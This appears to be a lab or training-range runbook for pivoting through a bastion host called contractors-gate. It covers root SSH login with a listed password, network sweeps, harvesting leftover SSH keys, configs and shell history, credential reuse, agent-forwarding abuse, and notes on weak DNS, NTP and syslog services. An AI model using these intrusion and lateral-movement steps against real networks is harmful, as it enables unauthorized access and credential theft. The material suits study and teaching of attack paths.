# Runbook: contractors-gate

## Entry

Port 22 on 10.10.5.20 is reachable from the internet zone. The credential chain from prior loot or from sorting-office
surfaces the root password.

```bash
ponder@unseen-gate:~$ ssh root@10.10.5.20
```

Password: `uupl2015`. The shell drops straight into a root session.

## Orientation

```bash
root@contractors-gate:~# whoami
root@contractors-gate:~# hostname
root@contractors-gate:~# ip addr
root@contractors-gate:~# ip route
```

`ip addr` shows three interfaces. `eth1` at `10.10.5.20/24` is the DMZ side. `eth2` at `10.10.1.30/24` is the enterprise
side. `eth0` carries no address. Two live segments, reachable from one shell.

`ip route` shows the routing table:

```
default via 10.10.5.201 dev eth1
10.10.1.0/24 dev eth2 proto kernel scope link src 10.10.1.30
10.10.5.0/24 dev eth1 proto kernel scope link src 10.10.5.20
```

The default gateway is on the DMZ side. The enterprise segment (`10.10.1.0/24`) is directly attached on eth2 with no
routing hop. This machine is the pivot point between the two zones.

## SSH configuration

```bash
root@contractors-gate:~# cat /etc/ssh/sshd_config
```

Three lines worth noting.

- `PermitRootLogin yes`: root access over SSH with a password is enabled.
- `PasswordAuthentication yes`: no key required.
- `AllowAgentForwarding yes`: a session opened with `ssh -A` can carry the connecting agent forward to downstream hosts,
  which reach further without any key material landing on this machine.

## Supporting infrastructure

### DNS

```bash
root@contractors-gate:~# dig @10.10.5.31 uupl-historian.uupl.am
```

`city-directory` at `10.10.5.31` is the DNS forwarder for the `uupl.am` domain. Open recursion, DNSSEC validation off. A
forged response injected into its cache redirects any subsequent lookup of that hostname for all clients using the same
resolver, including enterprise hosts.

### NTP

```bash
root@contractors-gate:~# cat /etc/ntp.conf | grep server
```

```
server 10.10.5.30 iburst
```

`guild-clock` at `10.10.5.30` is the time source. It accepts unauthenticated management on port `323/UDP`, so time can
be shifted without a credential. Downstream effects include corrupted log timestamps at `scribes-post` and TLS
certificate validation failures on hosts whose clocks drift outside a certificate validity window.

## What the enterprise segment contains

```bash
root@contractors-gate:~# nmap -sn -PS22,23 10.10.1.0/24
```

```
Nmap scan report for 10.10.1.3
Nmap scan report for 10.10.1.10
Nmap scan report for 10.10.1.20
Nmap scan report for 10.10.1.30
Nmap scan report for 10.10.1.201
Nmap scan report for 10.10.1.202
Nmap done: 256 IP addresses (6 hosts up) scanned in ...
```

Six hosts respond. The `.201` and `.202` addresses are routing infrastructure. The interesting ones are `.3` 
(wizzards-retreat), `.10` (hex-legacy-1), and `.20` (bursar-desk). Probe each to confirm what they offer:

```bash
root@contractors-gate:~# nc -zv 10.10.1.10 23
root@contractors-gate:~# nc -zv 10.10.1.20 22
root@contractors-gate:~# nc -zv 10.10.1.3 22
```

Port 23 is open on 10.10.1.10. Port 22 is open on both 10.10.1.20 and 10.10.1.3.

## Operational residue

The account has been used before. Most contractor bastions accumulate sediment.

```bash
root@contractors-gate:~# ls -la ~/.ssh/
```

Five entries: `authorized_keys`, `config`, `contractor_key`, `contractor_key.pub`, `known_hosts`.

```bash
root@contractors-gate:~# cat ~/.ssh/authorized_keys
```

One public key. The comment on the entry identifies the owning account: `contract-admin@uupl-maintenance`. The
corresponding private key (`contractor_key`) is also present in the same directory, left over from a maintenance
session.

```bash
root@contractors-gate:~# cat ~/.ssh/known_hosts
```

Host key entries for `10.10.1.20`, `10.10.1.10`, and `10.10.1.3`, written when the bastion connected inward during a
previous session. The presence of an entry confirms the bastion has reached that host before.

```bash
root@contractors-gate:~# cat ~/.ssh/config
```

Two `Host` stanzas. The first names `bursar-desk` at `10.10.1.20` with `bursardesk` as the user, which matches what the
enterprise sweep found. The second is more interesting:

```
Host eng-ws
    HostName 10.10.2.30
    User engineer
    ProxyJump bursar-desk
    IdentityFile ~/.ssh/contractor_key
```

`10.10.2.30` does not appear in the enterprise sweep. The subnet `10.10.2.0/24` is different from the enterprise range.
`ProxyJump bursar-desk` means whoever configured this expected to reach `eng-ws` by tunnelling through `bursar-desk`
first, rather than connecting directly. The `contractor_key` is listed as the identity to present at the destination.

Someone on the IT field team was accessing a machine in a different network segment, via the enterprise host, from this
bastion. The config was left here when they finished.

```bash
root@contractors-gate:~# cat ~/.bash_history
```

Previous session commands. Worth reading before acting: it shows which hosts were reached, which credentials were used,
what was copied where, and which DMZ services were probed.

```bash
root@contractors-gate:~# ls /tmp/
root@contractors-gate:~# cat /tmp/enterprise-sweep.txt
```

`enterprise-sweep.txt` is the output from a prior nmap run against the enterprise segment. The host discovery results
are already here without running the scan again.

## Logging

```bash
root@contractors-gate:~# cat /etc/rsyslog.d/50-forward.conf
```

```
*.* @10.10.5.32:514
```

rsyslog is configured forward-only. There is no `/var/log/auth.log`. Auth events from this machine, including every SSH
session open and close, go to the syslog relay at `scribes-post` (10.10.5.32:514) and nowhere else. The relay is on the
DMZ segment, reachable without authentication, and the traffic is plain UDP.

## Lateral movement to enterprise

Credentials collected from the enterprise zone work directly from here over eth2. No additional tunnelling is needed.

```bash
root@contractors-gate:~# ssh bursardesk@10.10.1.20
```

Password: `Octavo1` (from `ENGINEER.LOG` on hex-legacy-1).

```bash
root@contractors-gate:~# telnet 10.10.1.10
```

The Telnet session on hex-legacy-1 drops directly into a Win95 shell with no login prompt.

## Agent forwarding

Connect to the bastion with forwarding enabled:

```bash
ponder@unseen-gate:~$ ssh -A root@10.10.5.20
```

From the bastion shell, continue inward using the forwarded agent. No key material is written to the bastion:

```bash
root@contractors-gate:~# ssh bursardesk@10.10.1.20
```

The second hop authenticates via the forwarded agent if the destination trusts a key loaded in the originating agent.

## CVE-2024-6387

The SSH banner identifies OpenSSH 9.2p1-2. That version is affected by CVE-2024-6387 (regreSSHion), a signal handler race condition that can lead to unauthenticated remote code execution on glibc-based systems. Exploitation is timing-dependent and requires many connection attempts.

## What you can know now

Access:

- Shell as root on contractors-gate (10.10.5.20 / 10.10.1.30)
- Enterprise segment (10.10.1.0/24) directly attached on eth2, no routing hop required
- SSH to bursar-desk (10.10.1.20): `bursardesk / Octavo1`
- Telnet to hex-legacy-1 (10.10.1.10): no login required

Residue on disk:

- `/root/.ssh/contractor_key`: private key, comment `contract-admin@uupl-maintenance`
- `/root/.ssh/config`: two stanzas; `bursar-desk` at 10.10.1.20, and `eng-ws` at 10.10.2.30 via `ProxyJump bursar-desk`
  using the contractor key
- `/root/.ssh/known_hosts`: prior connections to 10.10.1.10, 10.10.1.20, 10.10.1.3
- `/root/.bash_history`: prior session commands
- `/tmp/enterprise-sweep.txt`: prior nmap output

DMZ infrastructure also reachable from here:

- `city-directory` at 10.10.5.31: DNS forwarder, open recursion, DNSSEC off
- `guild-clock` at 10.10.5.30: NTP source, no auth on port 323/UDP
- `scribes-post` at 10.10.5.32:514: syslog relay, UDP, no TLS
